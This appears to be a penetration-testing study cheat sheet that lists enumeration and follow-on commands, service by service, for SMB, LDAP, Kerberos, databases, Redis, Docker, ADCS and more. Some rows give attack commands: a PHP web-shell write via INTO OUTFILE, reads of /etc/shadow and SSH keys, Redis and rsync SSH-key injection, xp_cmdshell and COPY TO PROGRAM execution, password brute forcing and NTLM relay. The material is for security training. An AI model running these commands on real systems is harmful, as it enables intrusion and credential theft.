# Enumeration Completeness Matrix

## How to Use This Document

For every service you discover, this defines three levels of enumeration depth. Start at MINIMUM on every service you find. Only go deeper when you have time or when the standard checks haven't produced results.

**The goal:** Never miss an easy finding because you didn't do the basic checks.

---

## Legend

```
MIN    = Minimum enumeration (do this for every instance of this service)
REC    = Recommended enumeration (do this if MIN found nothing or partial)
DEEP   = Deep enumeration (do this when you're stuck or have time)
```

---

## SMB (Port 139, 445)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Null session check, list shares, user enum, check signing | `smbclient -N -L //target`, `rpcclient -U "" -N target enumdomusers`, `enum4linux -a target`, `nmap --script smb2-security-mode -p 445 target` |
| **REC** | Vuln scan, recursive share download, GPP check | `nmap --script smb-vuln-* -p 445 target`, `smbclient //target/share -N recurse prompt mget *`, `netexec smb target -u '' -p '' --shares --users` |
| **DEEP** | Authenticated enum, password spray, SMB relay setup, EternalBlue check, SMBv1 probe | `netexec smb target -u user -p pass --sam --lsa --users --groups`, `nmap --script smb-protocols -p 445 target` |

**Don't miss:** Null session, signing disabled, writable shares, GPP passwords

---

## LDAP (Port 389, 636, 3268, 3269)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Anonymous bind check | `ldapsearch -x -h target -b "dc=domain,dc=local"` |
| **REC** | Full LDAP dump (if anonymous), user list extraction | `ldapdomaindump -u '' -p '' target` |
| **DEEP** | Authenticated dump (with creds), BloodHound, LDAP signing check, LDAP relay check | `ldapdomaindump -u domain\\user -p pass target`, `bloodhound-python -u user -p pass -d domain -ns target` |

**Don't miss:** Anonymous bind, password in description fields, service account identification

---

## Kerberos (Port 88)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if DC (nslookup SRV), AS-REP roast sweep | `nslookup -type=SRV _kerberos._tcp.domain.local`, `GetNPUsers -dc-ip DC domain/ -usersfile users.txt` |
| **REC** | User enumeration via Kerbrute | `kerbrute userenum -d domain --dc DC /usr/share/seclists/Usernames/Names/names.txt` |
| **DEEP** | Kerberoast, delegation discovery, MS14-068 check, NoPac check | `GetUserSPNs -request`, `findDelegation.py domain/user:pass`, `nmap --script krb5-enum-users` |

**Don't miss:** AS-REP roastable users, Kerbrute user enum (even without creds)

---

## DNS (Port 53)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Zone transfer attempt, domain name resolution | `dig axfr @target domain.local`, `nslookup domain.local target` |
| **REC** | Subdomain brute force, reverse DNS lookup of subnet | `dnsrecon -d domain.local -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt -n target`, `dnsrecon -r <subnet>/24 -n target` |
| **DEEP** | DNS cache snooping, DNS tunneling check | `nmap --script dns-cache-snoop -p 53 target`, `dnsenum domain.local` |

**Don't miss:** Zone transfer, domain name discovery, internal DNS resolution

---

## FTP (Port 21)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Anonymous login check | `ftp anonymous@target`, `curl ftp://target/` |
| **REC** | Recursive file download, browse all directories | `wget -m ftp://anonymous:@target` |
| **DEEP** | File review (configs, backups, creds), brute force if not anonymous | `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target` |

**Don't miss:** Anonymous access, downloadable config files, backup files

---

## SSH (Port 22)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Version detection, banner grab, auth method check | `nc -nv target 22`, `ssh-keyscan -t rsa target` |
| **REC** | Weak key exchange check, default creds | `nmap --script ssh2-enum-algos -p 22 target` |
| **DEEP** | Brute force (if you have usernames), SSH key ID check, known vulnerabilities | `hydra -l user -P pass.txt ssh://target`, `searchsploit ssh <version>` |

**Don't miss:** Version-specific vulns, key exchange downgrade, default creds on appliances

---

## RDP (Port 3389)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Version check, SSL check, NLA requirement | `nmap --script rdp-ntlm-info -p 3389 target` |
| **REC** | BlueKeep check, credential spray | `nmap --script rdp-vuln-ms12-020 -p 3389 target`, `hydra -l user -P pass.txt rdp://target` |
| **DEEP** | Session enumeration, RDP man-in-the-middle, if creds → connect and explore | `xfreerdp /v:target /u:user /p:pass` |

**Don't miss:** NLA disabled, weak creds, session hijacking (if admin)

---

## WinRM (Port 5985, 5986)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if service is running, test with any creds you have | `nmap --script http-title -p 5985 target` |
| **REC** | Credential spray against WinRM | `netexec winrm target -u users.txt -p pass.txt` |
| **DEEP** | Post-access enumeration (if creds obtained) | `evil-winrm -i target -u user -p pass`, then `whoami /priv`, `whoami /groups` |

**Don't miss:** Spray with found creds, evil-winrm with hash (-H), local admin access

---

## HTTP/HTTPS (Port 80, 443, 8080, 8443)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Tech fingerprint, curl headers, page source review, robots.txt | `whatweb target`, `curl -s -I target`, `curl target | grep -i "<!--"` |
| **REC** | Directory fuzzing (medium list), file fuzzing, extension check, vhost fuzz | `ffuf -u target/FUZZ -w directory-list-2.3-medium.txt`, `ffuf -u target/FUZZ -w web-extensions.txt` |
| **DEEP** | Injection testing (all parameters), CMS scan, hidden endpoints, API discovery, parameter fuzzing, JS analysis | `ffuf -u target/FUZZ -w raft-large-directories.txt`, SQLi/LFI/CMDi on all params, `wpscan`, `gau target` |

**Don't miss:** robots.txt, sitemap.xml, .git exposure, backup files, hidden vhosts, injection in ALL parameters

---

## MSSQL (Port 1433)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Default creds check (sa:sa), version detection | `mssqlclient.py sa:sa@target` |
| **REC** | Authenticated enumeration (if creds), database listing, user extraction | `select name from sys.databases`, `exec xp_cmdshell 'whoami'` |
| **DEEP** | Linked server enumeration, full data extraction, command execution | `select * from sys.servers`, `exec ('xp_cmdshell ''whoami''') at [linked_server]` |

**Don't miss:** Default sa password, xp_cmdshell enable, linked servers

---

## MySQL (Port 3306)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Default creds check (root:root, root:empty) | `mysql -h target -u root -proot` |
| **REC** | Authenticated enumeration, database listing, user extraction | `show databases;`, `select * from mysql.user;` |
| **DEEP** | UDF exploitation, INTO OUTFILE web shell, LOAD_FILE reads | `select load_file('/etc/passwd');`, `select "<?php system($_GET['c']);" into outfile '/var/www/html/shell.php';` |

**Don't miss:** Default creds, LOAD_FILE for password files, INTO OUTFILE for webshell

---

## NFS (Port 2049)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | List exports, check mountable | `showmount -e target` |
| **REC** | Mount writable shares, browse files | `mount -t nfs target:/share /mnt/nfs`, `ls -la /mnt/nfs` |
| **DEEP** | SSH key extraction, config file search, no_root_squash exploitation | `find /mnt/nfs -name "id_rsa"`, if writable + no_root_squash → `chown root:root /mnt/nfs/script && chmod u+s` |

**Don't miss:** SSH keys in mounted home dirs, no_root_squash, readable config files

---

## SNMP (Port 161, 162)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Public community string check | `snmpwalk -v 2c -c public target` |
| **REC** | Full SNMP enumeration | `snmpwalk -v 2c -c public target .1.3.6.1.4.1.77.1.2.25` (users), `snmpcheck -t target -c public` |
| **DEEP** | Process enumeration, installed software, Windows user enumeration, running services | `snmpenum -t target -c public`, `onesixtyone target public private manager` |

**Don't miss:** Public community, user enumeration (userTable), running processes

---

## SMTP (Port 25, 587)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Banner grab, EHLO, VRFY check | `nc target 25`, `VRFY root`, `EXPN root` |
| **REC** | User enumeration (VRFY/EXPN/RCPT TO) | `smtp-user-enum -M VRFY -U users.txt -t target` |
| **DEEP** | Open relay check, email extraction | `nmap --script smtp-open-relay -p 25 target` |

**Don't miss:** User enumeration via VRFY/EXPN, open relay

---

## Redis (Port 6379)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Connect without auth, version check | `redis-cli -h target`, `INFO` |
| **REC** | Key dump, sensitive data extraction | `KEYS *`, `GET <key>` |
| **DEEP** | SSH key injection (if writable), config overwrite for RCE | `config set dir /root/.ssh`, `config set dbfilename authorized_keys`, `save` |

**Don't miss:** No-auth access, SSH key injection, data extraction

---

## POP3/IMAP (Port 110, 143, 993, 995)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Banner grab, check for default creds | `nc target 110`, `USER admin`, `PASS admin` |
| **REC** | User enumeration, mailbox dump | `curl --user user:pass pop3://target` |
| **DEEP** | Email content review for credentials, password resets | Download all emails, grep for pass/user/credential |

**Don't miss:** Default creds, password reset emails, password in inbox

---

## TFTP (Port 69)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Connect and list files | `tftp target`, `get /etc/passwd` |
| **REC** | Config file download attempt | `tftp target get /etc/config`, `tftp target get config.txt` |
| **DEEP** | Brute force file names | Use TFTP brute force to guess file names (router configs, backup files) |

**Don't miss:** Unauthenticated file read, config files with creds

---

## PostgreSQL (Port 5432)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Default creds (postgres:postgres) | `psql -h target -U postgres` |
| **REC** | Authenticated dump, database listing, user table extraction | `\l`, `\dt`, `SELECT * FROM pg_user` |
| **DEEP** | RCE via COPY TO PROGRAM, UDF upload | `COPY (SELECT '') TO PROGRAM 'whoami'` |

**Don't miss:** Default creds, COPY TO PROGRAM for RCE, pg_read_file for file read

---

## Rsync (Port 873)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | List available modules | `rsync target::` |
| **REC** | Download module content | `rsync -av target::module /local/path` |
| **DEEP** | Write to module (if writable), SSH key injection | `rsync -av id_rsa.pub target::module/.ssh/authorized_keys` |

**Don't miss:** Anonymous read access, writable modules

---

## NetBIOS (Port 137, 138, 139)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Name service lookup | `nmblookup -A target` |
| **REC** | NetBIOS name dump, domain discovery | `nbtscan target/24` |
| **DEEP** | Cross-reference with SMB enumeration | `nmap --script nbstat -p 137 target` |

**Don't miss:** Domain membership identification, hostname to IP mapping

---

## MySQL/MariaDB (Port 3306)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Default creds (root:empty, root:root) | `mysql -h target -u root` |
| **REC** | Authenticated DB dump, hash extraction from mysql.user | `select host,user,authentication_string from mysql.user;` |
| **DEEP** | LOAD_FILE for system files, INTO OUTFILE for webshell, UDF for RCE | `select load_file('/etc/shadow');`, `select 'payload' into outfile '/var/www/html/shell.php';` |

**Don't miss:** root with no password, LOAD_FILE (/etc/passwd, /etc/shadow, /root/.ssh/id_rsa)

---

## VNC (Port 5900, 5901)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check access, version detection | `nmap --script vnc-info -p 5900 target` |
| **REC** | No-auth check, password brute force | `vncdotool connect target wait`, `hydra -P rockyou.txt vnc://target` |
| **DEEP** | If connected: explore desktop, file access | `vncviewer target` |

**Don't miss:** No-auth VNC, weak passwords

---

## IPMI (Port 623)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Version detection, cipher zero check | `nmap --script ipmi-cipher-zero -p 623 target` |
| **REC** | Default creds check, anonymous access | `ipmitool -I lanplus -H target -U admin -P admin user list` |
| **DEEP** | Hash dump via RAKP | `nmap --script ipmi-rakp-hash-crack -p 623 target` |

**Don't miss:** Cipher zero auth bypass, default creds

---

## Docker (Port 2375, 2376)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check for unauthenticated access | `docker -H tcp://target:2375 ps` |
| **REC** | List images, start containers, check for host mounts | `docker -H tcp://target:2375 images`, `docker -H tcp://target:2375 run -v /:/host -it alpine /bin/sh` |
| **DEEP** | Container breakout, host filesystem access, credential search in container volumes | `cat /host/etc/shadow`, `cat /host/root/.ssh/id_rsa` |

**Don't miss:** Docker API without auth → instant host access

---

## CIFS/SMB Signing Check (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if SMB signing is enabled/required | `nmap --script smb2-security-mode -p 445 target` |
| **REC** | Build list of hosts with signing disabled | `netexec smb targets.txt --gen-relay-list unsigned-hosts.txt` |
| **DEEP** | Set up relay infrastructure, test relay to ADCS | `ntlmrelayx.py -tf unsigned-hosts.txt -smb2support`, `ntlmrelayx.py -t http://DC/certsrv -adcs` |

**Don't miss:** Signing disabled + ADCS = instant DA (ESC8 relay)

---

## DNS Zone Transfer (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Attempt AXFR from DC | `dig axfr @target domain.local` |
| **REC** | Attempt AXFR with domain admin/any creds | `dig @target domain.local -y hmac-sha1:keyname:base64key` |
| **DEEP** | DNS enumeration of all records | `dnsrecon -d domain.local -a -n target` |

**Don't miss:** Zone transfer reveals all hosts in domain

---

## ADCS Enumeration (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if ADCS is present | `curl http://DC/certsrv` (returns page = ADCS present) |
| **REC** | certipy find to identify ESC vulnerabilities (requires creds) | `certipy find -u user@domain -p pass -dc-ip DC` |
| **DEEP** | Check all ESC scenarios (1-10), attempt exploitation | `certipy req -u user@domain -p pass -ca CA -template VulnTemplate`, `certipy auth -pfx cert.pfx -dc-ip DC` |

**Don't miss:** ADCS present = potential ESC1-ESC10 chain. Almost always exploitable.

---

## BloodHound Enumeration (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Run BloodHound collector with basic collection | `bloodhound-python -u user -p pass -d domain -ns DC -c All` |
| **REC** | Full analysis: Shortest paths to DA, Kerberoastable users, AS-REP users, DCSync rights | BloodHound GUI: Pre-built analytics queries |
| **DEEP** | Custom Cypher queries, session analysis, GPO abuse paths, trust paths | `MATCH p=()-[r:MemberOf|HasSession|AdminTo]->() RETURN p`, `MATCH (n:User)-[:GenericAll|ForceChangePassword|WriteOwner|WriteDACL|AddMember]->(m:Group) WHERE m.name CONTAINS 'ADMIN' RETURN n` |

**Don't miss:** BloodHound should be run immediately upon getting any domain credential

---

## LAPS Enumeration (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if LAPS is in use (computer objects have ms-Mcs-AdmPwd) | `netexec ldap DC -u user -p pass -M laps` |
| **REC** | Read LAPS passwords for all computers you can access | `netexec ldap DC -u user -p pass -M laps --bloodhound` |
| **DEEP** | Use LAPS password for local admin on additional hosts → LSASS dump | `netexec smb target -u localadmin -p lapspass` |

**Don't miss:** LAPS gives local admin on domain hosts without needing domain admin

---

## gMSA Enumeration (Special)

| Depth | Actions | Commands |
|-------|---------|----------|
| **MIN** | Check if gMSA accounts exist | `netexec ldap DC -u user -p pass -M gmsa` |
| **REC** | Retrieve gMSA password (requires specific privileges) | `gmsadump.py -u domain\\user -p pass -d domain.local -dc-ip DC` |
| **DEEP** | Use gMSA credentials for service access | Test gMSA against service hosts |

**Don't miss:** gMSA passwords can be retrieved by authorized users → service account access

---

## Quick Reference: Enumeration Priorities

```
ALWAYS CHECK FIRST (on every host):
├── Port 445 (SMB): null session + signing (CRITICAL)
├── Port 389 (LDAP): anonymous bind (CRITICAL)
├── Port 88 (Kerberos): AS-REP roast (HIGH)
├── Port 80/443 (HTTP): web + content discovery (HIGH)
├── Port 22 (SSH): version + banner (MEDIUM)
├── Port 21 (FTP): anonymous (MEDIUM)
├── Port 1433 (MSSQL): default creds (MEDIUM)
├── Port 2049 (NFS): exports (MEDIUM)
└── Port 161 (SNMP): public string (MEDIUM)

ALWAYS CHECK IN BACKGROUND:
├── Responder (start at minute 0, stop when AD done)
└── Hashcat (start when you get first hash)

ALWAYS CHECK WITH DOMAIN CREDS:
├── BloodHound
├── ADCS (certipy)
├── Kerberoast
├── LAPS
├── gMSA
└── LDAP dump
```

---

## Cross-References

- Operational execution strategy → [exam-execution-playbook.md](exam-execution-playbook.md)
- Full service exploitation → [Module 07: Common Services](07-common-services.md)
- Web application testing → [Module 04: Web Application](04-web-application.md)
- AD enumeration → [Module 11: Active Directory](11-active-directory.md)
- Attack graph navigation → [Module 99: Attack Graph](99-attack-graph.md)
